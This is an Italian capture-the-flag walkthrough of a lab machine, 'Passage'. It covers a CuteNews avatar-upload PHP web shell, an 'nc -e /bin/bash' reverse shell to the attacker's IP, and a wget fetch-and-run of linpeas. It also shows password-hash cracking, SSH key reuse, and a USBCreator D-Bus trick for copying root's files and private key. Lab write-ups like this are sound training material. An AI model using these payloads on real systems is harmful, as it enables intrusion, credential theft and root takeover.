@@ -1,0 +1,132 @@
+---------------------------------------------------------------------------------------------------------------
+nmap -A -Pn -n -vvv 10.10.10.206
+
+	PORT   STATE SERVICE REASON  VERSION
+	22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+	| ssh-hostkey: 
+	|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)                                                                                                                                                                             
+	| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVnCUEEK8NK4naCBGc9im6v6c67d5w/z/i72QIXW9JPJ6bv/rdc45FOdiOSovmWW6onhKbdUje+8NKX1LvHIiotFhc66Jih+AW8aeK6pIsywDxtoUwBcKcaPkVFIiFUZ3UWOsWMi+qYTFGg2DEi3OHHWSMSPzVTh+YIsCzkRCHwcecTBNipHK645LwdaBLESJBUieIwuIh8icoESGaNcirD/DkJjjQ3xKSc4nbMnD7D6C1tIgF9TGZadvQNqMgSmJJRFk/hVeA/PReo4Z+WrWTvPuFiTFr8RW+yY/nHWrG6LfldCUwpz0jj/kDFGUDYHLBEN7nsFZx4boP8+p52D8F                                                                                        
+	|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)                                                                                                                                                                            
+	| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCdB2wKcMmurynbHuHifOk3OGwNcZ1/7kTJM67u+Cm/6np9tRhyFrjnhcsmydEtLwGiiY5+tUjr2qeTLsrgvzsY=                                                                         
+	|   256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)                                                                                                                                                                          
+	|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGRIhMr/zUartoStYphvYD6kVzr7TDo+gIQfS2WwhSBd                                                                                                                                                         
+	80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))                                                                                                                                                                                
+	| http-methods:                                                                                                                                                                                                                            
+	|_  Supported Methods: GET HEAD POST OPTIONS                                                                                                                                                                                               
+	|_http-server-header: Apache/2.4.18 (Ubuntu)                                                                                                                                                                                               
+	|_http-title: Passage News                                                                                                                                                                                                                 
+	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
+
+---------------------------------------------------------------------------------------------------------------
+Creiamo il record nel file degli host name 
+sudo vi /etc/hosts
+10.10.10.206	passage.htb
+
+---------------------------------------------------------------------------------------------------------------
+Effettuiamo una scansione con dirb 
+dirb http://10.10.10.206 -w /usr/share/wordlists/dirb/common.txt
+
+Veniamo bloccati. Questo è dovuto alla presenza di fail2ban
+---------------------------------------------------------------------------------------------------------------
+Analizziamo il codice della pagina e troviamo un commento (/* Dealing with cookies */ function cn_get_cookie_val(offset)), 
+cerchiamo su internet e capiamo che viene utilizzato CuteNews.
+CuteNews ha una vulnerabilità nota. Andiamo al seguente link per verificare che in effetti venga utilizzato http://10.10.10.206/CuteNews/index.php
+
+La pagina si carica.
+---------------------------------------------------------------------------------------------------------------
+https://musyokaian.medium.com/cutenews-2-1-2-remote-code-execution-vulnerability-450f29673194
+Verifichiamo se è presente la vulnerabilità.
+
+Step 1 -> Creiamo un file .php con il seguente codice "GIF8;\n<?php system($_REQUEST['cmd']) ?>"
+Step 2 -> Creare un account e caricare il file precedente come avatar
+Step 3 -> Testare il seguente link: http://10.10.10.206/CuteNews/uploads/avatar_fake_image.php?cmd=whoami -> GIF8;\nwww-data 
+Step 4 -> Avviare in console il seguente comando "nc -nlvp 4444"
+Step 5 -> http://10.10.10.206/CuteNews/uploads/avatar_fake_image.php?cmd=nc%20-e%20/bin/bash%2010.10.14.196%204444
+
+Console ottenuta!
+
+---------------------------------------------------------------------------------------------------------------
+Verifichiamo che versione di Python è installata nella macchina e passiamo ad una shell con pieni comandi
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+ls /home -> Scopriamo che ci sono 2 utenti nadav e paul
+
+Cerchiamo se l'utente è tra i sudoers -> NIENTE
+sudo -l 
+
+Cerchiamo se l'utente ha SUID -> NIENTE
+find / -perm -u=s -type f 2>/dev/null
+
+Cerchiamo file scrivibili -> NIENTE
+find /-writable -type d 2>/dev/null
+
+Visualizziamo i log del sistema -> NIENTE
+cat /var/log/audit/audit.log
+
+Verifichiamo la presenza di backup che possano essere utili -> NIENTE
+apache, db ecc.
+
+Controlliamo anche i cronjob -> NIENTE
+cat /etc/crontab
+
+Scarichiamo linpeas.sh, attiviamo il server sulla nostra macchina e scarichiamo nella macchina attaccata
+sudo python -m SimpleHTTPServer 80
+wget http://10.10.15.9:80/linpeas.sh
+chmod 777 linpeas.sh
+./linpeas.sh 2>&1 | more
+
+Analizziamo linpeas.
+Troviamo un file particolare /var/www/html/CuteNews/cdata/users/lines (http://10.10.10.206/CuteNews/cdata/users/lines). 
+Analizziamo stringa per stringa decodificando prima in base64 e poi in sha256 e troviamo la password dell'utente paul
+YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTkyNDgzMjM2IjtzOjQ6Im5hbWUiO3M6MTA6InBhdWwtY29sZXMiO3M6MzoiYWNsIjtzOjE6IjIiO3M6NToiZW1haWwiO3M6MTY6InBhdWxAcGFzc2FnZS5odGIiO3M6NDoibmljayI7czoxMDoiUGF1bCBDb2xlcyI7czo0OiJwYXNzIjtzOjY0OiJlMjZmM2U4NmQxZjgxMDgxMjA3MjNlYmU2OTBlNWQzZDYxNjI4ZjQxMzAwNzZlYzZjYjQzZjE2ZjQ5NzI3M2NkIjtzOjM6Imx0cyI7czoxMDoiMTU5MjQ4NTU1NiI7czozOiJiYW4iO3M6MToiMCI7czozOiJjbnQiO3M6MToiMiI7fX19 
+a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}} 
+e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd -> atlanta1
+
+
+---------------------------------------------------------------------------------------------------------------
+su paul:atlanta1
+ls -la /home/pual -> user.txt
+cat /home/paul/user.txt -> 0fab439a91664dd80ce61eec54751729
+---------------------------------------------------------------------------------------------------------------
+Analizziamo i file all'interno di paul. Analizzando .ssh/authorized_keys, troviamo che nadav condivide le chiavi con paul.
+Salviamo la chiave privata di paul e creiamo il file id_rsa.
+Diamo i permessi chmod 600 id_rsa
+
+ssh -i id_rsa nadav@passage.htb -> Siamo dentro!
+
+---------------------------------------------------------------------------------------------------------------
+uname -a -> Linux passage 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+Cerco la versione di linux e trovo uno script (https://www.exploit-db.com/exploits/47167) ma niente da fare.
+
+Cerco qualche info tra i comandi
+->find / -perm -u=s -type f 2>/dev/null
+->find /-writable -type d 2>/dev/null
+->find / -perm 1000 2>/dev/null
+
+Ma niente di utile...
+
+Controllo i processi -> ps aux
+Spulcio un po' e trovo un software in python usb-creator-helper. Cerco qualcosa a riguardo e scopro che ha una vulnerabilità che permete la "privilege escalation"
+
+Cerco e trovo il seguente link -> https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
+
+Eseguo i comandi per verificare che funzioni:
+->echo "Test on file" > a.txt
+->gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/a.sh /a.txt true
+->ll /a.txt 
+Funziona! Il file ha permessi da root. Ora la domanda sorge spontanea, come sfruttare per ottenere l'accesso al root?
+
+Mi scervello un po' e provo con una reverse shell. Provo, ma niente. Il file viene creato dall'utente root ma per il gruppo e gli altri ha solo permesso di lettura.
+
+Doppia IDEA!
+1)Copiare la flag in modo da poterla leggere: 
+-> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/root.txt /root.txt true
+-> cat /root.txt -> 89d39b162f0dd22bf3111e9890562670
+
+2)Copiare la chiave ssh del root e collegarmi tramite ssh
+-> gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa_root true
+-> cat /id_rsa_root
+-> Copio la chiave su un file nel mio sistema
+-> ssh -i id_rsa_root root@passage.htb -> Sono dentro!
+-> cat /root/root.txt -> 89d39b162f0dd22bf3111e9890562670
+
